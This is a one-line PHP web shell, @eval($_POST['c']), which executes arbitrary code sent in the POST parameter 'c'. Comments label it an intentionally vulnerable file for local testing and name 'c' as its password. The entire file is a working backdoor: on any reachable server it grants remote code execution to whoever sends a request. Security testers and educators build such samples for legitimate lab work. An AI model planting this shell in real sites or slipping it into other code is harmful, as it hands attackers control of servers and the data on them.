<?php
// Intentionally vulnerable one-line webshell for local testing only.
// password parameter: c  (POST)
@eval($_POST['c']);
